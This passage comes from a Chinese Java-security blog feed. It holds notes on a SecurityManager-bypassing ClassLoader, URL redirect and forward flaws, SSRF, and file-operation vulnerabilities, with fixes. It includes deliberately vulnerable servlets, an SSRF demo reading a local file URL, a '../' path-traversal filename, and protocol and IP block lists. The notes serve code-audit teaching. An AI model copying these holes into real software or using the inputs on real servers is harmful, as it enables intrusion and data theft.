class="line">            <span class="keyword">return</span> defineClazz(name, bytes, <span class="number">0</span>, bytes.length);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">super</span>.findClass(name);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">final</span> Class&lt;?&gt; defineClazz(String name, <span class="keyword">byte</span>[] b, <span class="keyword">int</span> off, <span class="keyword">int</span> len) <span class="keyword">throws</span> ClassFormatError &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            PermissionCollection pc = <span class="keyword">new</span> Permissions();</span><br><span class="line">            pc.add(<span class="keyword">new</span> AllPermission());</span><br><span class="line"></span><br><span class="line">            <span class="comment">//设置ProtectionDomain</span></span><br><span class="line">            ProtectionDomain pd = <span class="keyword">new</span> ProtectionDomain(<span class="keyword">new</span> CodeSource(<span class="keyword">null</span>, (Certificate[]) <span class="keyword">null</span>),</span><br><span class="line">                                                       pc, <span class="keyword">this</span>, <span class="keyword">null</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">this</span>.defineClass(name, b, off, len, pd);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> File <span class="title">getClassFile</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        File file = <span class="keyword">new</span> File(<span class="string">"./"</span> + name + <span class="string">".class"</span>);</span><br><span class="line">        <span class="keyword">return</span> file;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">byte</span>[] getClassBytes(File file) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        FileInputStream fis = <span class="keyword">new</span> FileInputStream(file);</span><br><span class="line">        FileChannel fc = fis.getChannel();</span><br><span class="line">        ByteArrayOutputStream baos = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        WritableByteChannel wbc = Channels.newChannel(baos);</span><br><span class="line">        ByteBuffer by = ByteBuffer.allocate(<span class="number">1024</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (<span class="keyword">true</span>) &#123;</span><br><span class="line">            <span class="keyword">int</span> i = fc.read(by);</span><br><span class="line">            <span class="keyword">if</span> (i == <span class="number">0</span> || i == -<span class="number">1</span>) &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            by.flip();</span><br><span class="line">            wbc.write(by);</span><br><span class="line">            by.clear();</span><br><span class="line">        &#125;</span><br><span class="line">        fis.close();</span><br><span class="line">        <span class="keyword">return</span> baos.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="0x04-参考链接："><a href="#0x04-参考链接：" class="headerlink" title="0x04 参考链接："></a>0x04 参考链接：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;docs.oracle.com&#x2F;javase&#x2F;tutorial&#x2F;essential&#x2F;environment&#x2F;security.html</span><br><span class="line">https:&#x2F;&#x2F;docs.oracle.com&#x2F;javase&#x2F;8&#x2F;docs&#x2F;api&#x2F;java&#x2F;lang&#x2F;SecurityManager.html</span><br><span class="line">https:&#x2F;&#x2F;docs.oracle.com&#x2F;javase&#x2F;8&#x2F;docs&#x2F;technotes&#x2F;guides&#x2F;security&#x2F;PolicyFiles.html</span><br><span class="line">https:&#x2F;&#x2F;c0d3p1ut0s.github.io&#x2F;%E6%94%BB%E5%87%BBJava%E6%B2%99%E7%AE%B1&#x2F;</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;codeplutos&#x2F;java-security-manager-bypass</span><br><span class="line">https:&#x2F;&#x2F;docs.oracle.com&#x2F;javase&#x2F;8&#x2F;docs&#x2F;technotes&#x2F;guides&#x2F;security&#x2F;doprivileged.html</span><br><span class="line">https:&#x2F;&#x2F;tech101.cn&#x2F;2019&#x2F;08&#x2F;15&#x2F;AccessController%E7%9A%84doPrivileged%E6%96%B9%E6%B3%95%E7%9A%84%E4%BD%9C%E7%94%A8</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Java安全 </category>
          
          <category> SecurityManager </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SecurityManager </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>URL跳转和重定向</title>
      <link href="2021/09/21/Java%20URL%E8%B7%B3%E8%BD%AC%E6%80%BB%E7%BB%93/"/>
      <url>2021/09/21/Java%20URL%E8%B7%B3%E8%BD%AC%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h4 id="URL跳转和URL重定向的区别："><a href="#URL跳转和URL重定向的区别：" class="headerlink" title="URL跳转和URL重定向的区别："></a>URL跳转和URL重定向的区别：</h4><ol><li>地址栏变化：URL跳转地址栏不变，重定向地址栏会变；</li><li>服务端还是浏览器端跳转：URL跳转是服务端跳转，重定向是客户端跳转</li></ol><h4 id="URL重定向："><a href="#URL重定向：" class="headerlink" title="URL重定向："></a>URL重定向：</h4><p>Java关键字</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sendRedirect</span><br><span class="line">setHeader</span><br><span class="line">redirect</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>示例：</p><p>两种方式重定向，sendRedirect或者setHeader，如下代码跳转的url可控，存在重定向问题。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RedirectServlert</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">        String url = req.getParameter(<span class="string">"url"</span>);</span><br><span class="line">        <span class="comment">// 方法1</span></span><br><span class="line">        resp.sendRedirect(url);</span><br><span class="line">        <span class="comment">// 方法2</span></span><br><span class="line">        resp.setStatus(HttpServletResponse.SC_FOUND); <span class="comment">// 302</span></span><br><span class="line">        resp.setHeader(<span class="string">"Location"</span>,url);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doPost</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">        doGet(req, resp);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="URL跳转："><a href="#URL跳转：" class="headerlink" title="URL跳转："></a>URL跳转：</h4><p>Java关键字</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">forward</span><br></pre></td></tr></table></figure><p>示例：</p><p>用getRequestDispatcher(uri).forward()转发请求，uri可控。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ForwardServlet</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">        String uri = req.getParameter(<span class="string">"uri"</span>);</span><br><span class="line">        req.getRequestDispatcher(uri).forward(req, resp);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doPost</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">        doGet(req, resp);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="URL重定向修复方法："><a href="#URL重定向修复方法：" class="headerlink" title="URL重定向修复方法："></a>URL重定向修复方法：</h4><ol><li>使用白名单校验重定向的 url 地址；</li><li>向用户提示安全风险，由用户再次确认是否跳转（微信等应用常见）。</li></ol><p>参考链接：</p><p><a href="https://www.dazhuanlan.com/uamyall/topics/1034221" target="_blank" rel="noopener">https://www.dazhuanlan.com/uamyall/topics/1034221</a></p>]]></content>
      
      
      <categories>
          
          <category> Java安全 </category>
          
          <category> URL重定向 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> URL跳转 </tag>
            
            <tag> URL重定向 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java SSRF漏洞总结</title>
      <link href="2021/09/21/Java-SSRF%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/"/>
      <url>2021/09/21/Java-SSRF%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<p>Java SSRF关键字：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">HttpClient.execute</span><br><span class="line">HttpClient.executeMethod</span><br><span class="line">HttpURLConnection.connect</span><br><span class="line">HttpURLConnection.getInputStream</span><br><span class="line">URL.openStream</span><br><span class="line">HttpServletRequest</span><br><span class="line">getParameter</span><br><span class="line">URI</span><br><span class="line">URL</span><br><span class="line">HttpClient</span><br><span class="line">HttpServletRequest</span><br><span class="line">HttpURLConnection</span><br><span class="line">URLConnection</span><br><span class="line">okhttp</span><br><span class="line">BasicHttpEntityEnclosingRequest</span><br><span class="line">DafauleBHttpClientConnection</span><br><span class="line">BasicHttpRequest</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>Java下ssrf简单的示例：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Ssrf</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Ssrf ssrf = <span class="keyword">new</span> Ssrf();</span><br><span class="line">        <span class="comment">//        ssrf.requestByURLConnection("http://www.baidu.com");</span></span><br><span class="line">        ssrf.requestByURLConnection(<span class="string">"file:///E:/111.txt"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * URLConnection支持的协议：file ftp mailto http https jar netdoc gopher</span></span><br><span class="line"><span class="comment">     * gopher仅在java8以前支持，并且Java7高版本对gopher有限制</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">requestByURLConnection</span><span class="params">(String url)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//        url = "file:///E:/111.txt";</span></span><br><span class="line">        <span class="comment">//        url = "http://www.baidu.com"</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">this</span>.urlFilterByWhiteList(url).equals(<span class="string">""</span>))&#123;</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            String htmlContent;</span><br><span class="line">            URL u = <span class="keyword">new</span> URL(url);   <span class="comment">//实例化url的对象</span></span><br><span class="line">            URLConnection urlConnection = u.openConnection();<span class="comment">//打开一个URL连接，并运行客户端访问资源。</span></span><br><span class="line">            <span class="comment">//            HttpURLConnection urlConnection1 = (HttpURLConnection) urlConnection;  //转成HttpURLConnection</span></span><br><span class="line">            BufferedReader bufferedReader = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(urlConnection.getInputStream(), <span class="string">"UTF-8"</span>));<span class="comment">//获取url中的资源</span></span><br><span class="line">            StringBuffer html = <span class="keyword">new</span> StringBuffer();</span><br><span class="line">            <span class="keyword">while</span> ((htmlContent = bufferedReader.readLine()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">                html.append(htmlContent);</span><br><span class="line">            &#125;</span><br><span class="line">            bufferedReader.close();</span><br><span class="line">            System.out.println(html);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 过滤url，增加白名单校验</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> String <span class="title">urlFilterByWhiteList</span><span class="params">(String url)</span> </span>&#123;</span><br><span class="line">        String[] whiteProtocolList = &#123;<span class="string">"http://"</span>, <span class="string">"https://"</span>&#125;;</span><br><span class="line">        String[] whiteUrlList = &#123;<span class="string">"http://enable.com/"</span>,<span class="string">"http://enable1.com/"</span>&#125;;</span><br><span class="line">        <span class="keyword">boolean</span> protocolFlag = <span class="keyword">false</span>;</span><br><span class="line">        <span class="keyword">boolean</span> urlFlag = <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (String list : whiteProtocolList) &#123;</span><br><span class="line">            <span class="keyword">if</span> (url.toLowerCase().contains(list) &amp;&amp; url.toLowerCase().indexOf(list) == <span class="number">0</span>) &#123;</span><br><span class="line">                protocolFlag = <span class="keyword">true</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(!protocolFlag)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">""</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (String list : whiteUrlList) &#123;</span><br><span class="line">            <span class="keyword">if</span> (url.toLowerCase().contains(list) &amp;&amp; url.toLowerCase().indexOf(list) == <span class="number">0</span>) &#123;</span><br><span class="line">                urlFlag = <span class="keyword">true</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(!urlFlag)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">""</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> url;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 过滤url，增加黑名单校验</span></span><br><span class="line"><span class="comment">     * 黑名单校验存在绕过风险</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> String <span class="title">urlFilterByBlackList</span><span class="params">(String url)</span> </span>&#123;</span><br><span class="line">        String[] blackProtocolList = &#123;<span class="string">"file"</span>, <span class="string">"ftp"</span>, <span class="string">"mailto"</span>, <span class="string">"jar"</span>, <span class="string">"netdoc"</span>, <span class="string">"gopher"</span>&#125;;</span><br><span class="line">        String[] blackUrlList = &#123;<span class="string">"192.168"</span>, <span class="string">"172."</span>, <span class="string">"169.254"</span>&#125;;</span><br><span class="line">        <span class="keyword">boolean</span> protocolFlag = <span class="keyword">false</span>;</span><br><span class="line">        <span class="keyword">boolean</span> urlFlag = <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (String list : blackProtocolList) &#123;</span><br><span class="line">            <span class="keyword">if</span> (url.toLowerCase().contains(list) &amp;&amp; url.toLowerCase().indexOf(list) == <span class="number">0</span>) &#123;</span><br><span class="line">                protocolFlag = <span class="keyword">true</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(protocolFlag)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">""</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (String list : blackUrlList) &#123;</span><br><span class="line">            <span class="keyword">if</span> (url.toLowerCase().contains(list) &amp;&amp; url.toLowerCase().indexOf(list) == <span class="number">0</span>) &#123;</span><br><span class="line">                urlFlag = <span class="keyword">true</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(urlFlag)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">""</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> url;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ssrf修复（来自《Java代码审计》）：</p><p>1、统一错误信息，避免用户根据错误信息来判断远端服务器的端口状态。<br>2、限制请求的端口为 http 的常用端口，比如80、443、8080、8090等。<br>3、禁用不需要的协议，仅仅允许 http 和 https 请求。<br>4、根据业务需求，判定所需的域名是否是常用的几个，若是，则将这几个特定的域名加入白名单,拒绝白名单域名之外的请求。<br>5、根据请求来源，判定请求地址是否是固定请求来源，若是，则将这几个特定的域名/ IP添加到白名单,拒绝白名单域名/IP之外的请求。<br>6、若业务需求和请求来源并不固定,则可以自己编写一个 ssrfCheck 函数,检测特定的域名、判断是否是内网 IP 、判断是否为 http / https 协议等。</p><p>参考链接：</p><p><a href="https://www.bookstack.cn/read/anbai-inc-javaweb-sec/javase-URLConnection-README.md" target="_blank" rel="noopener">https://www.bookstack.cn/read/anbai-inc-javaweb-sec/javase-URLConnection-README.md</a></p>]]></content>
      
      
      <categories>
          
          <category> Java安全 </category>
          
          <category> SSRF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SSRF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java文件操作类漏洞总结</title>
      <link href="2021/09/21/Java%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E7%B1%BB%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/"/>
      <url>2021/09/21/Java%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E7%B1%BB%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<p>文件操作相关漏洞包括文件包含、文件上传、文件读取、文件写入、文件删除、文件解压漏洞。</p><h4 id="1、Java文件操作关键字："><a href="#1、Java文件操作关键字：" class="headerlink" title="1、Java文件操作关键字："></a>1、Java文件操作关键字：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">File</span><br><span class="line">FileUpload</span><br><span class="line">MultipartFile</span><br><span class="line">FileInputStream</span><br><span class="line">FileOutputStream</span><br><span class="line">MultipartRequestEntity</span><br><span class="line">FileUtils</span><br><span class="line">UploadHandleServlet</span><br><span class="line">FileLoadServlet</span><br><span class="line">createNewFile</span><br><span class="line">FileReader</span><br><span class="line">RandomAccessFile</span><br><span class="line">ImageIO</span><br><span class="line">DiskFileItemFactory</span><br><span class="line">ZipInputStream</span><br><span class="line">ZipEntry</span><br><span class="line">...</span><br></pre></td></tr></table></figure><h4 id="2、文件包含"><a href="#2、文件包含" class="headerlink" title="2、文件包含"></a>2、文件包含</h4><p>参考链接：<a href="https://www.cnblogs.com/jinqi520/p/9360713.html" target="_blank" rel="noopener">https://www.cnblogs.com/jinqi520/p/9360713.html</a></p><p>静态包含:</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%<span class="meta">@include</span> file=<span class="string">"top.jsp"</span>%&gt;</span><br></pre></td></tr></table></figure><p>动态包含：</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;jsp:include page=<span class="string">"&lt;%=file%&gt;"</span> /&gt;</span><br></pre></td></tr></table></figure><p>漏洞实例：<a href="https://xz.aliyun.com/t/7683" target="_blank" rel="noopener">tomcat  AJP cve-2020-1938分析</a></p><h4 id="3、模拟任意文件读取-文件上传"><a href="#3、模拟任意文件读取-文件上传" class="headerlink" title="3、模拟任意文件读取/文件上传"></a>3、模拟任意文件读取/文件上传</h4><p>模拟客户端上传文件到服务器 或者从服务器下载文件：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.io.FilenameUtils;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* 模拟客户端上传、下载文件</span></span><br><span class="line"><span class="comment">* */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FileUploadOrDownload</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        <span class="comment">//        String fileName = "111.png";</span></span><br><span class="line">        String fileName = <span class="string">"../../../../../../../../../../../../../../../../111.png"</span>;</span><br><span class="line">        FileUploadOrDownload fileUploadOrDownload = <span class="keyword">new</span> FileUploadOrDownload();</span><br><span class="line">        fileUploadOrDownload.getImg(fileName);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">getImg</span><span class="params">(String fileName)</span></span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 1、模拟客户端上传文件</span></span><br><span class="line">            <span class="comment">// 2、或者服务器端返回文件给客户端</span></span><br><span class="line"><span class="comment">//            FileInputStream imgFile = this.getImgFileNoFix(fileName);</span></span><br><span class="line">            FileInputStream imgFile = <span class="keyword">this</span>.getImgFileWithFix(fileName);</span><br><span class="line">            <span class="keyword">if</span>(imgFile==<span class="keyword">null</span>)&#123;</span><br><span class="line">                System.out.println(<span class="string">"File not found!"</span>);</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 1、模仿客户端下载，设置文件保存的路径和文件名  跟上面注释1对应</span></span><br><span class="line">            <span class="comment">// 2、或者服务器接收客户端上传的文件，设置文件保存的路径和文件名  跟上面注释2对应</span></span><br><span class="line">            File tmp = <span class="keyword">new</span> File(<span class="string">"./owasp/src/main/resources/tmp"</span>, <span class="string">"tmp"</span>);</span><br><span class="line">            FileOutputStream fileOutputStream = <span class="keyword">new</span> FileOutputStream(tmp);</span><br><span class="line">            <span class="keyword">int</span> len;</span><br><span class="line">            <span class="keyword">byte</span>[] bytes = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">1024</span>];</span><br><span class="line">            <span class="keyword">while</span> ((len=imgFile.read(bytes))!=-<span class="number">1</span>)&#123;</span><br><span class="line">                fileOutputStream.write(bytes,<span class="number">0</span>,len);</span><br><span class="line">            &#125;</span><br><span class="line">            fileOutputStream.close();</span><br><span class="line">            imgFile.close();</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> FileInputStream <span class="title">getImgFileWithFix</span><span class="params">(String fileName)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 获取文件名，不包含路径（过滤路径穿越相关符号）</span></span><br><span class="line">        fileName = 